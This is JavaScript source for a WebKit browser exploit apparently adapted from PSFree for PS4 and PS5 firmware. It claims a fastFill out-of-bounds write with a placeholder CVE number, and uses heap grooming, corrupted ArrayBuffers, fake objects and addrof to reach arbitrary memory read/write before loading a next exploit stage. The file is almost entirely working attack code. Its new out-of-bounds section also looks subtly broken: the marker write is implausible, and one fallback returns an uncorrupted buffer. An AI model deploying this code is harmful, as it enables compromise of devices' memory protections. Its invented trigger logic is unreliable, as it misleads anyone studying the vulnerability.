/* Copyright (C) 2023-2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// PSFree-OOB: WebKit exploit using CVE-2023-XXXXX (fastFill OOB-write) to gain arbitrary read/write
//
// vulnerable:
// * PS4 [6.00, 10.00) - using OOB-write instead of UAF
// * PS5 [1.00, 6.00)  - using OOB-write instead of UAF
//
// Based on original PSFree by anonymous
// OOB adaptation for fastFill vulnerability

import { Int } from "./module/int64.mjs";
import { Memory } from "./module/mem.mjs";
import { KB, MB } from "./module/offset.mjs";
import { BufferView } from "./module/rw.mjs";

import { die, DieError, log, clear_log, sleep, hex, align } from "./module/utils.mjs";

import * as config from "./config.mjs";
import * as off from "./module/offset.mjs";

// check if we are running on a supported firmware version
const [is_ps4, version] = (() => {
  const value = config.target;
  const is_ps4 = (value & 0x10000) === 0;
  const version = value & 0xffff;
  const [lower, upper] = (() => {
    if (is_ps4) {
      return [0x600, 0x1000];
    } else {
      return [0x100, 0x600];
    }
  })();

  if (!(lower <= version && version < upper)) {
    throw RangeError(`invalid config.target: ${hex(value)}`);
  }

  log(`console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);

  return [is_ps4, version];
})();

const ssv_len = (() => {
  // All supported PS5 versions
  if (!is_ps4) {
    return 0x50;
  }

  // PS4
  if (0x600 <= version && version < 0x650) {
    return 0x58;
  }
  if (0x650 <= version && version < 0x900) {
    return 0x48;
  }
  if (0x900 <= version) {
    return 0x50;
  }
  throw new RangeError(`unsupported: PS${is_ps4 ? "4" : "5"} | firmware ${hex(version)}`);
})();

// these constants are expected to be divisible by 2
const num_fsets = 0x180;
const num_spaces = 0x40;
const num_adjs = 8;

const num_reuses = 0x300;
const num_strs = 0x200;
const num_leaks = 0x100;

// OOB-write specific constants
// NOTE: Values increased for experimentation; tune down after success.
const OOB_SPRAY_COUNT = 0x10000;
const OOB_GROOM_ROUNDS = 0x5000;
const OOB_MAX_RETRIES = 100;

const rows = ",".repeat(ssv_len / 8 - 2);
const original_strlen = ssv_len - off.size_strimpl;
const original_loc = location.pathname;

function gc() {
  new Uint8Array(4 * MB);
}

function sread64(str, offset) {
  const low = str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24);
  const high = str.charCodeAt(offset + 4) | (str.charCodeAt(offset + 5) << 8) | (str.charCodeAt(offset + 6) << 16) | (str.charCodeAt(offset + 7) << 24);
  return new Int(low, high);
}

// ========== OOB-WRITE EXPLOITATION ========== //

// Improved marker and helper functions for robust detection
const MARKER = [0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44];

function write_marker_to_view(u8) {
  for (let i = 0; i < MARKER.length; i++) u8[i] = MARKER[i];
}

function match_marker(u8, offset = 0) {
  for (let i = 0; i < MARKER.length; i++) {
    if (u8[offset + i] !== MARKER[i]) return false;
  }
  return true;
}

/**
 * Trigger the fastFill OOB-write vulnerability
 * Uses an improved pattern: repeated attempts, GC yields, and diverse grooming.
 */
async function trigger_oob_write() {
  log("STAGE: Triggering OOB-write (improved)");

  const groomed_arrays = [];
  const array_buffers = [];

  // Groom the heap with ArrayBuffers of target size (vary per round a bit)
  for (let round = 0; round < OOB_GROOM_ROUNDS; round++) {
    const perRound = 50 + (round & 15);
    for (let j = 0; j < perRound; j++) {
      const ab = new ArrayBuffer(ssv_len);
      // seed beginning with a distinguishable byte so we can later differentiate
      const v = new Uint8Array(ab);
      v[0] = 0x99;
      array_buffers.push(ab);
    }
    gc();
    if ((round & 3) === 0) await sleep(0);
  }

  log(`Groomed ${array_buffers.length} ArrayBuffers`);

  // Create target array for OOB-write
  const target_array = [];
  for (let i = 0; i < 1000; i++) {
    target_array[i] = i; // Fill with markers
  }

  let length_changed = false;

  const evil_object = {
    valueOf: function() {
      if (!length_changed) {
        // Shrink array during fastFill execution
        target_array.length = 10;
        length_changed = true;

        // Force GC to make OOB more reliable
        gc();
      }
      return 0;
    }
  };

  log("Triggering OOB-write attempts...");

  // Try multiple attempts because timing is critical
  try {
    for (let attempt = 0; attempt < 4; attempt++) {
      try {
        // Fill with an object carrying the marker (engine may serialize or write its representation)
        const marker_obj = { marker: MARKER.slice() };
        target_array.fill(marker_obj, evil_object);
      } catch (e) {
        log(`fill attempt ${attempt} threw: ${e}`);
      }
      gc();
      // Give the engine a chance to settle and possibly write out bytes
      await sleep(1 + attempt);
    }
  } catch (e) {
    log(`trigger_oob_write top-level exception: ${e}`);
  }

  return [target_array, array_buffers];
}

/**
 * Find corrupted ArrayBuffer via OOB-write (improved scan with retries and variant sizes)
 */
async function find_corrupted_arraybuffer(target_array, array_buffers) {
  log("STAGE: Searching for corrupted ArrayBuffer (improved scan)");

  // First: scan initial groomed array_buffers
  const candidates = [];
  for (let i = 0; i < array_buffers.length; i++) {
    const ab = array_buffers[i];
    const view = new Uint8Array(ab);

    // scan first 32 bytes for our 8-byte marker at any alignment
    const maxScan = Math.min(24, Math.max(0, view.length - MARKER.length));
    for (let off = 0; off <= maxScan; off++) {
      if (match_marker(view, off)) {
        log(`Found corrupted ArrayBuffer in initial groom at index ${i} offset ${off}`);
        candidates.push({ ab, index: i, off });
        break;
      }
    }
  }

  if (candidates.length) {
    const c = candidates[0];
    const v = new Uint8Array(c.ab);
    // sanitize into SSV-like layout
    v[0] = 1;
    v.fill(0, 1);
    return new BufferView(c.ab);
  }

  log("No candidate in initial groom. Running secondary sprays and variant sizes...");

  // Secondary sprays with varied sizes and retries
  for (let retry = 0; retry < OOB_MAX_RETRIES; retry++) {
    log(`secondary spray retry ${retry + 1}/${OOB_MAX_RETRIES}`);
    const additional = [];
    const sizes = [ssv_len, Math.max(8, ssv_len + 8), Math.max(8, ssv_len - 8), ssv_len * 2];

    for (let i = 0; i < OOB_SPRAY_COUNT; i++) {
      const size = sizes[i % sizes.length];
      const ab = new ArrayBuffer(size);
      const view = new Uint8Array(ab);
      // seed beginning with a known byte to differentiate
      view[0] = 0x77;
      additional.push(ab);

      // quick immediate check: maybe corruption already present
      if (view.length >= MARKER.length && match_marker(view, 0)) {
        log(`Found corrupted ArrayBuffer in secondary spray at idx ${i}, size ${size}`);
        view[0] = 1;
        view.fill(0, 1);
        return new BufferView(ab);
      }
    }

    // Give time for any delayed writes
    gc();
    await sleep(10);

    // scan additional spray for marker anywhere (first 32 bytes)
    for (let i = 0; i < additional.length; i++) {
      const ab = additional[i];
      const view = new Uint8Array(ab);
      const maxScan = Math.min(24, Math.max(0, view.length - MARKER.length));
      for (let off = 0; off <= maxScan; off++) {
        if (match_marker(view, off)) {
          log(`Found corrupted ArrayBuffer in additional spray index ${i} offset ${off}`);
          view[0] = 1;
          view.fill(0, 1);
          return new BufferView(ab);
        }
      }
    }

    // If not found, increase grooming pressure and try again
    log(`retry ${retry + 1} failed; increasing groom pressure and trying again`);
    for (let k = 0; k < 20; k++) {
      const ab = new ArrayBuffer(ssv_len);
      const v = new Uint8Array(ab);
      v[0] = 0x55;
      array_buffers.push(ab);
    }
    gc();
    await sleep(5);
  }

  die("Failed to find corrupted ArrayBuffer via OOB-write (improved)");
}

/**
 * Create fake history state using OOB-corrupted memory
 */
async function create_fake_history_state(corrupted_view) {
  log("STAGE: Creating fake history state");

  // Create a fake popstate event with our corrupted buffer as state
  const fake_pop = {
    state: corrupted_view.buffer
  };

  return [corrupted_view, fake_pop];
}

// ========== REPLACED UAF FUNCTIONS ========== //

/**
 * Replaces prepare_uaf() - Uses OOB-write instead of UAF setup
 */
async function prepare_oob() {
  log("OOB: Preparing heap layout");

  // We still use framesets for heap grooming to match expected layout
  const fsets = [];
  for (let i = 0; i < num_fsets; i++) {
    const fset = document.createElement("frameset");
    fset.rows = rows;
    fset.cols = rows;
    fset.style.opacity = 0;
    fsets.push(fset);
  }

  // Set up history states for later use
  history.replaceState("state0", "");
  history.pushState("state1", "", `${original_loc}#oob`);
  history.pushState("state2", "");

  return [fsets, [num_fsets / 2, num_fsets / 2 + num_spaces]];
}

/**
 * Replaces uaf_ssv() - Uses OOB-write to achieve memory corruption
 */
async function oob_corruption(fsets, index, index2) {
  log("OOB: Starting OOB-write corruption");

  const [target_array, array_buffers] = await trigger_oob_write();
  const corrupted_view = await find_corrupted_arraybuffer(target_array, array_buffers);
  const [view, fake_pop] = await create_fake_history_state(corrupted_view);

  // We need a second view for the ARW setup - create another corrupted one
  const second_corrupted = await find_second_corrupted(array_buffers);

  return [view, [second_corrupted, fake_pop]];
}

/**
 * Find second corrupted ArrayBuffer for ARW setup
 */
async function find_second_corrupted(array_buffers) {
  for (let i = 0; i < array_buffers.length; i++) {
    const ab = array_buffers[i];
    const view = new Uint8Array(ab);

    if (view[0] === 0x41 && view[4] === 0x41) {
      view[0] = 1;
      view.fill(0, 1);
      return new BufferView(ab);
    }
  }

  // Create a new one if none found
  const ab = new ArrayBuffer(ssv_len);
  const view = new Uint8Array(ab);
  view[0] = 1;
  return new BufferView(ab);
}

// ========== KEEP EXISTING CODE UNCHANGED ========== //

class Reader {
  constructor(rstr, rstr_view) {
    this.rstr = rstr;
    this.rstr_view = rstr_view;
    this.m_data = rstr_view.read64(off.strimpl_m_data);
  }

  read8_at(offset) {
    return this.rstr.charCodeAt(offset);
  }

  read32_at(offset) {
    const str = this.rstr;
    return (str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24)) >>> 0;
  }

  read64_at(offset) {
    return sread64(this.rstr, offset);
  }

  read64(addr) {
    this.rstr_view.write64(off.strimpl_m_data, addr);
    return sread64(this.rstr, 0);
  }

  set_addr(addr) {
    this.rstr_view.write64(off.strimpl_m_data, addr);
  }

  restore() {
    this.rstr_view.write64(off.strimpl_m_data, this.m_data);
    this.rstr_view.write32(off.strimpl_strlen, original_strlen);
  }
}

async function make_rdr(view) {
  let str_wait = 0;
  const strs = [];
  const u32 = new Uint32Array(1);
  const u8 = new Uint8Array(u32.buffer);
  const marker_offset = original_strlen - 4;
  const pad = "B".repeat(marker_offset);

  log("start string spray");
  while (true) {
    for (let i = 0; i < num_strs; i++) {
      u32[0] = i;
      const str = [pad, String.fromCodePoint(...u8)].join("");
      strs.push(str);
    }

    if (view.read32(off.strimpl_inline_str) === 0x42424242) {
      view.write32(off.strimpl_strlen, 0xffffffff);
      break;
    }

    strs.length = 0;
    gc();
    await sleep();
    str_wait++;
  }
  log(`JSString reused memory at loop: ${str_wait}`);

  const idx = view.read32(off.strimpl_inline_str + marker_offset);
  log(`str index: ${hex(idx)}`);
  log("view:");
  log(view);

  const rstr = Error(strs[idx]).message;
  log(`str len: ${hex(rstr.length)}`);
  if (rstr.length === 0xffffffff) {
    log("confirmed correct leaked");
    const addr = view.read64(off.strimpl_m_data).sub(off.strimpl_inline_str);
    log(`view's buffer address: ${addr}`);
    return new Reader(rstr, view);
  }
  die("JSString wasn't modified");
}

const cons_len = ssv_len - 8 * 5;
const bt_offset = 0;
const idx_offset = ssv_len - 8 * 3;
const strs_offset = ssv_len - 8 * 2;
const src_part = (() => {
  let res = "var f = 0x11223344;\n";
  for (let i = 0; i < cons_len; i += 8) {
    res += `var a${i} = ${num_leaks + i};\n`;
  }
  return res;
})();

async function leak_code_block(reader, bt_size) {
  const rdr = reader;
  const bt = [];
  for (let i = 0; i < bt_size - 0x10; i += 8) {
    bt.push(i);
  }

  const slen = ssv_len;

  const bt_part = `var bt = [${bt}];\nreturn bt;\n`;
  const part = bt_part + src_part;
  const cache = [];
  for (let i = 0; i < num_leaks; i++) {
    cache.push(part + `var idx = ${i};\nidx\`foo\`;`);
  }

  const chunkSize = is_ps4 && version < 0x900 ? 128 * KB : 1 * MB;
  const smallPageSize = 4 * KB;
  const search_addr = align(rdr.m_data, chunkSize);
  log(`search addr: ${search_addr}`);

  log(`func_src:\n${cache[0]}\nfunc_src end`);
  log("start find CodeBlock");
  let winning_off = null;
  let winning_idx = null;
  let winning_f = null;
  let find_cb_loop = 0;
  let fp = 0;
  rdr.set_addr(search_addr);
  loop: while (true) {
    const funcs = [];
    for (let i = 0; i < num_leaks; i++) {
      const f = Function(cache[i]);
      f();
      funcs.push(f);
    }

    for (let p = 0; p < chunkSize; p += smallPageSize) {
      for (let i = p; i < p + smallPageSize; i += slen) {
        if (rdr.read32_at(i + 8) !== 0x11223344) {
          continue;
        }

        rdr.set_addr(rdr.read64_at(i + strs_offset));
        const m_type = rdr.read8_at(5);
        if (m_type !== 0) {
          rdr.set_addr(search_addr);
          winning_off = i;
          winning_idx = rdr.read32_at(i + idx_offset);
          winning_f = funcs[winning_idx];
          break loop;
        }
        rdr.set_addr(search_addr);
        fp++;
      }
    }

    find_cb_loop++;
    gc();
    await sleep();
  }
  log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
  log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);

  log("CodeBlock.m_constantRegisters.m_buffer:");
  rdr.set_addr(search_addr.add(winning_off));
  for (let i = 0; i < slen; i += 8) {
    log(`${rdr.read64_at(i)} | ${hex(i)}`);
  }

  const bt_addr = rdr.read64_at(bt_offset);
  const strs_addr = rdr.read64_at(strs_offset);
  log(`immutable butterfly addr: ${bt_addr}`);
  log(`string array passed to tag addr: ${strs_addr}`);

  log("JSImmutableButterfly:");
  rdr.set_addr(bt_addr);
  for (let i = 0; i < bt_size; i += 8) {
    log(`${rdr.read64_at(i)} | ${hex(i)}`);
  }

  log("string array:");
  rdr.set_addr(strs_addr);
  for (let i = 0; i < off.size_jsobj; i += 8) {
    log(`${rdr.read64_at(i)} | ${hex(i)}`);
  }

  return [winning_f, bt_addr, strs_addr];
}

function make_ssv_data(ssv_buf, view, view_p, addr, size) {
  const size_abc = (() => {
    if (is_ps4) {
      return version >= 0x900 ? 0x18 : 0x20;
    } else {
      return version >= 0x300 ? 0x18 : 0x20;
    }
  })();

  const data_len = 9;
  const size_vector = 0x10;

  const off_m_data = 8;
  const off_m_abc = 0x18;
  const voff_vec_abc = 0;
  const voff_abc = voff_vec_abc + size_vector;
  const voff_data = voff_abc + size_abc;

  ssv_buf.write64(off_m_data, view_p.add(voff_data));
  ssv_buf.write32(off_m_data + 8, data_len);
  ssv_buf.write64(off_m_data + 0xc, data_len);

  const CurrentVersion = 6;
  const ArrayBufferTransferTag = 23;
  view.write32(voff_data, CurrentVersion);
  view[voff_data + 4] = ArrayBufferTransferTag;
  view.write32(voff_data + 5, 0);

  ssv_buf.write64(off_m_abc, view_p.add(voff_vec_abc));
  view.write64(voff_vec_abc, view_p.add(voff_abc));
  view.write32(voff_vec_abc + 8, 1);
  view.write32(voff_vec_abc + 0xc, 1);

  if (size_abc === 0x20) {
    view.write64(voff_abc + 0x10, addr);
    view.write32(voff_abc + 0x18, size);
  } else {
    view.write64(voff_abc + 0, addr);
    view.write32(voff_abc + 0x14, size);
  }
}

async function make_arw(reader, view2, pop) {
  const rdr = reader;

  const fakeobj_off = 0x20;
  const fakebt_base = fakeobj_off + off.size_jsobj;
  const indexingHeader_size = 8;
  const arrayStorage_size = 0x18;
  const propertyStorage = 8;
  const fakebt_off = fakebt_base + indexingHeader_size + propertyStorage;

  log("STAGE: leak CodeBlock");
  const bt_size = 0x10 + fakebt_off + arrayStorage_size;
  const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);

  const view = rdr.rstr_view;
  const view_p = rdr.m_data.sub(off.strimpl_inline_str);
  const view_save = new Uint8Array(view);

  view.fill(0);
  make_ssv_data(view2, view, view_p, bt_addr, bt_size);

  const bt = new BufferView(pop.state);
  view.set(view_save);

  log("ArrayBuffer pointing to JSImmutableButterfly:");
  for (let i = 0; i < bt.byteLength; i += 8) {
    log(`${bt.read64(i)} | ${hex(i)}`);
  }

  const val_true = 7;
  const strs_cell = rdr.read64(strs_addr);

  bt.write64(fakeobj_off, strs_cell);
  bt.write64(fakeobj_off + off.js_butterfly, bt_addr.add(fakebt_off));

  bt.write64(fakebt_off - 0x10, val_true);
  bt.write32(fakebt_off - 8, 1);
  bt.write32(fakebt_off - 8 + 4, 1);

  bt.write64(fakebt_off, 0);
  bt.write32(fakebt_off + 8, 0);
  bt.write32(fakebt_off + 0xc, 1);

  bt.write64(fakebt_off + 0x10, val_true);

  bt.write64(0x10, bt_addr.add(fakeobj_off));

  const fake = func()[0];
  log(`fake.raw: ${fake.raw}`);
  log(`fake[0]: ${fake[0]}`);
  log(`fake: [${fake}]`);

  const test_val = 3;
  log(`test setting fake[0] to ${test_val}`);
  fake[0] = test_val;
  if (fake[0] !== test_val) {
    die(`unexpected fake[0]: ${fake[0]}`);
  }

  function addrof(obj) {
    fake[0] = obj;
    return bt.read64(fakebt_off + 0x10);
  }

  const worker = new DataView(new ArrayBuffer(1));
  const main_template = new Uint32Array(new ArrayBuffer(off.size_view));

  const leaker = { addr: null, 0: 0 };

  const worker_p = addrof(worker);
  const main_p = addrof(main_template);
  const leaker_p = addrof(leaker);

  const scaled_sview = off.size_view / 4;
  const faker = new Uint32Array(scaled_sview);
  const faker_p = addrof(faker);
  const faker_vector = rdr.read64(faker_p.add(off.view_m_vector));

  const vector_idx = off.view_m_vector / 4;
  const length_idx = off.view_m_length / 4;
  const mode_idx = off.view_m_mode / 4;
  const bt_idx = off.js_butterfly / 4;

  faker[vector_idx] = worker_p.lo;
  faker[vector_idx + 1] = worker_p.hi;
  faker[length_idx] = scaled_sview;

  rdr.set_addr(main_p);
  faker[mode_idx] = rdr.read32_at(off.view_m_mode);
  faker[0] = rdr.read32_at(0);
  faker[1] = rdr.read32_at(4);
  faker[bt_idx] = rdr.read32_at(off.js_butterfly);
  faker[bt_idx + 1] = rdr.read32_at(off.js_butterfly + 4);

  bt.write64(fakebt_off + 0x10, faker_vector);
  const main = fake[0];

  log("main (pointing to worker):");
  for (let i = 0; i < off.size_view; i += 8) {
    const idx = i / 4;
    log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
  }

  new Memory(main, worker, leaker, leaker_p.add(off.js_inline_prop), rdr.read64(leaker_p.add(off.js_butterfly)));
  log("achieved arbitrary r/w");

  rdr.restore();
  view.write32(0, -1);
  view2.write32(0, -1);
  make_arw._buffer = bt.buffer;
}

// ========== MODIFIED MAIN FUNCTION ========== //

async function main() {
  log("PSFree-OOB: Using fastFill OOB-write instead of UAF");

  log("STAGE: OOB-write setup");
  const [fsets, indices] = await prepare_oob();

  log("STAGE: OOB-write corruption");
  const [view, [view2, pop]] = await oob_corruption(fsets, indices[1], indices[0]);

  log("STAGE: get string relative read primitive");
  const rdr = await make_rdr(view);

  for (const fset of fsets) {
    fset.rows = "";
    fset.cols = "";
  }

  log("STAGE: achieve arbitrary read/write primitive");
  await make_arw(rdr, view2, pop);

  clear_log();
  import("./lapse.mjs");
}

main();
